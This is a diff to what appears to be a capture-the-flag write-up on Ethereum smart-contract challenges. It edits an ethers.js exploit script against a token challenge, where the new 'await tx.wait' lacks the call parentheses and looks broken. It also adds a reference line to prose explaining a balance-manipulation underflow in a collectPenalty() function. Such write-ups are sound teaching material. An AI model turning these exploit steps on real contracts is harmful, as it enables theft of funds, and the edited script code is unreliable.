@@ -318,11 +318,11 @@ This process can be done manually or by using a simple script.
                 const instance = await ethers.getContractAt("ITokenWhaleChallenge", instanceAddr);
                 
                 const tx1 = await instance.connect(owner).approve(alice.address, 1);
-                await wait(tx1);
+                await tx1.wait;
                 const tx2 = await instance.connect(alice).transferFrom(owner.address, ethers.constants.AddressZero, 1);
-                await wait(tx2);
+                await tx2.wait;
                 const tx3 = await instance.connect(alice).transfer(owner.address, 2000000);
-                await wait(tx3);
+                await tx3.wait;
 
             });
         });
@@ -334,6 +334,8 @@ This process can be done manually or by using a simple script.
 The main vulnerability of this level is within the `collectPenalty()` function while calculating the `withdrawn` amount. This calculation can be easily manipulated because the balance of a contract can be increased by three ways. Essentially, increasing the balance of the contract will make that `address(this).balance > startBalance` and it will underflow the `uint256` giving an extremely high value of `withdrawn` thus passing the following require and then performing the transfer.
 
 The first one is by sending a regular transfer to the contract. This is only possible if the contract implements a payable fallback function (such as a `fallback payable` itself or `receive payable`). Because the contract does not implement those functions, this way is discarded.
+
+Useful link and quote for the following ways: [SWC-132] 
 
 The second one is by precalculating the address of the level contract and send 1 wei to that address. To do so, it is only needed to know the address of the deployer and the current nonce of that address. This Python script precalculates the address by knowing both the deployers' address and nonce (values that can be get by surfing etherscan for example):
 
